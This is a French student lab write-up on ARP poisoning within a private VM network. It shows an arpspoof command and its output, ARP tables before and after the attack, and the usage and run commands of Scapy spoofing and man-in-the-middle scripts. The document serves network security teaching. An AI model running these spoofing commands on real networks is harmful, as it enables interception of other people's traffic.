# Partie IV : ARP Poisoning

## 1. Simple ARP spoof

- Table ARP de `node2.tp1.my`
```
[vm-2@node2 ~]$ ip n s
10.1.1.1 dev enp1s0 lladdr 52:54:00:da:33:63 DELAY 
10.1.1.100 dev enp1s0 lladdr 52:54:00:2d:8b:c8 STALE 
10.1.1.253 dev enp1s0 lladdr 52:54:00:ad:a7:59 STALE 
```

- Début de l'ARP Poisoning pour associer l'address MAC de `node1.tp1.my` à l'IP de `dhcp.tp1.my`
```
[vm-1@node1 ~]$ sudo arpspoof -t 10.1.1.101 10.1.1.253
52:54:0:2d:8b:c8 52:54:0:7b:ae:9d 0806 42: arp reply 10.1.1.253 is-at 52:54:0:2d:8b:c8
52:54:0:2d:8b:c8 52:54:0:7b:ae:9d 0806 42: arp reply 10.1.1.253 is-at 52:54:0:2d:8b:c8
52:54:0:2d:8b:c8 52:54:0:7b:ae:9d 0806 42: arp reply 10.1.1.253 is-at 52:54:0:2d:8b:c8
52:54:0:2d:8b:c8 52:54:0:7b:ae:9d 0806 42: arp reply 10.1.1.253 is-at 52:54:0:2d:8b:c8
```

- Résulat sur la table ARP de `node2.tp1.my`, on remarque que l'address MAC pour 10.1.1.100 (`node1`) et 10.1.1.253 (`dhcp`) est la même !
```
[vm-2@node2 ~]$ ip n s
10.1.1.1 dev enp1s0 lladdr 52:54:00:da:33:63 DELAY 
10.1.1.100 dev enp1s0 lladdr 52:54:00:2d:8b:c8 STALE 
10.1.1.253 dev enp1s0 lladdr 52:54:00:2d:8b:c8 REACHABLE 
```
- 🦈 le [pcap](./pcaps/arp_spoof_1.pcap)  
On remarque que `node1` spam de réponse ARP `node2` (sans changer la MAC src de la trame qui reste celle de `node1` d'ailleurs).  
Lorsque l'on stop la commande `arpspoof`, on remarque que `node1` effectue une dernière vague de spam pour fournir la vrai address MAC associé à l'IP de `dhcp`


## 2. Avec Scapy

- Le [script](./arp_spoof.py), avec une gestion d'argument
```
sudo python3 arp_spoof.py --help

usage: arp_spoof.py [-h] [--my-MAC MY_MAC] [--target-IP TARGET_IP] [--target-MAC TARGET_MAC] [--spoofed-IP SPOOFED_IP]

Script avec des variables configurables.

options:
  -h, --help            show this help message and exit
  --my-MAC MY_MAC       Votre adresse MAC (par défaut: 52:54:00:2d:8b:c8)
  --target-IP TARGET_IP
                        Adresse IP cible (par défaut: 10.1.1.101)
  --target-MAC TARGET_MAC
                        Adresse MAC cible (par défaut: 52:54:00:7b:ae:9d)
  --spoofed-IP SPOOFED_IP
                        Adresse IP usurpée (par défaut: 10.1.1.253)
```
=> Execution du script (les paramètres par défault match mon infra)
```
sudo python3 arp_spoof.py
```

- Table ARP de `node2` :
=> Avant :
```
[vm-2@node2 ~]$ ip n s
10.1.1.253 dev enp1s0 lladdr 52:54:00:ad:a7:59 REACHABLE 
10.1.1.100 dev enp1s0 lladdr 52:54:00:2d:8b:c8 STALE 
10.1.1.1 dev enp1s0 lladdr 52:54:00:da:33:63 REACHABLE 
```

=> Après :
```
[vm-2@node2 ~]$ ip n s
10.1.1.253 dev enp1s0 lladdr 52:54:00:2d:8b:c8 REACHABLE 
10.1.1.100 dev enp1s0 lladdr 52:54:00:2d:8b:c8 STALE 
10.1.1.1 dev enp1s0 lladdr 52:54:00:da:33:63 REACHABLE 
```

- Le [pcap](./pcaps/arp_spoof_2.pcap) (ça spam fort)


## 3. Man in the middle

- Le nouveau [script](./scripts/arp_spoof_mit.py)
```
[vm-1@node1 ~]$ sudo python3 arp_spoof_mit.py --help
usage: arp_spoof_mit.py [-h] [--my-MAC MY_MAC]
                        [--target1-IP TARGET1_IP]
                        [--target1-MAC TARGET1_MAC]
                        [--target2-IP TARGET2_IP]
                        [--target2-MAC TARGET2_MAC]

Script avec des variables configurables.

optional arguments:
  -h, --help            show this help message and exit
  --my-MAC MY_MAC       Votre adresse MAC (par défaut:
                        52:54:00:2d:8b:c8)
  --target1-IP TARGET1_IP
                        Adresse IP cible numéro 1 (par défaut:
                        10.1.1.101)
  --target1-MAC TARGET1_MAC
                        Adresse MAC cible numéro 1 (par défaut:
                        52:54:00:7b:ae:9d)
  --target2-IP TARGET2_IP
                        Adresse IP cible numéro 2 (par défaut:
                        10.1.1.253)
  --target2-MAC TARGET2_MAC
                        Adresse MAC cible numéro 2 (par défaut:
                        52:54:00:ad:a7:59)
```
=> Exécution du script : `sudo python3 arp_spoof_mit.py`


- le 🦈 [pcap](./pcaps/arp_mitm_1.pcap)
=> j'ai mis un `sleep(2)` entre chaque envoie des trames ARP (pour faciliter la lecture)
=> On remarque bien que les 3 premiers pings (`node2` vers `dhcp`) est bien reçu et `node1` assure bien la transition
=> Idem pour les 3 autres pings (`dhcp` vers `node2`)